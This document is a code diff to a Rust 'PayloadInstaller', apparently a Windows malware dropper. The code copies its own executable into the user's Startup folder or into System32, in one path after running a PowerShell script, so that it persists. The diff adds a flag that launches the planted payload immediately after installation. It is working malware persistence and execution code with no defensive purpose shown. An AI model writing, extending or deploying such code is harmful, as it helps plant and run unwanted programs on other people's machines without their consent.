@@ -52,6 +52,7 @@ impl PayloadInstaller {
     /// * `program_path` - The path of the program to copy to the startup folder
     /// * `program_name` - The name of the program to copy to the startup folder
     /// * `user_name` - The name of the user to copy the program to the startup folder
+    /// * `run_prg` - A boolean indicating if the program should be run after copying it to the startup folder
     ///
     /// # Returns
     ///
@@ -62,6 +63,7 @@ impl PayloadInstaller {
         program_path: &str,
         program_name: &str,
         user_name: &str,
+        run_prg: bool,
     ) -> io::Result<()> {
         //Code to copy the program to the startup folder
 
@@ -71,7 +73,12 @@ impl PayloadInstaller {
         );
         let startup_path = format!("{}\\{}", startup_folder, program_name);
 
-        std::fs::copy(program_path, startup_path)?;
+        std::fs::copy(program_path, startup_path.clone())?;
+
+        if run_prg {
+            std::process::Command::new(&startup_path).spawn()?;
+        }
+
         Ok(())
     }
 
@@ -96,6 +103,10 @@ impl PayloadInstaller {
 
     /// Run the payload installer. It must be called after creating a new instance of `PayloadInstaller`.
     /// It must be called as administrator
+    ///
+    /// # Arguments
+    ///
+    /// * `run_prg` - A boolean indicating if the payload should be run after installing it
     ///
     /// # Returns
     ///
@@ -122,7 +133,7 @@ impl PayloadInstaller {
     ///   Err(e) => println!("Error: {}", e),
     /// }
     /// ```
-    pub fn run(&self) -> io::Result<()> {
+    pub fn run(&self, run_prg: bool) -> io::Result<()> {
         let program_path = std::env::current_exe()?
             .parent()
             .unwrap()
@@ -153,17 +164,30 @@ impl PayloadInstaller {
                     &program_name,
                 )?;
                 self.copy_file_to_system32(&program_to_copy, &program_name)?;
+
+                if run_prg {
+                    std::process::Command::new(format!("{}{}", WINDOWS_SYSTEM32, &program_name))
+                        .spawn()?;
+                }
             }
 
-            2 => self.copy_file_to_startup(
-                &program_to_copy,
-                &program_name,
-                &aux.get_current_user_name(),
-            )?,
+            2 => {
+                self.copy_file_to_startup(
+                    &program_to_copy,
+                    &program_name,
+                    &aux.get_current_user_name(),
+                    run_prg,
+                )?;
+            }
 
             3 => {
                 aux.run_powershell_script(WINDOWS_SYSTEM32, &program_name)?;
                 self.copy_file_to_system32(&program_to_copy, &program_name)?;
+
+                if run_prg {
+                    std::process::Command::new(format!("{}{}", WINDOWS_SYSTEM32, &program_name))
+                        .spawn()?;
+                }
             }
 
             _ => {
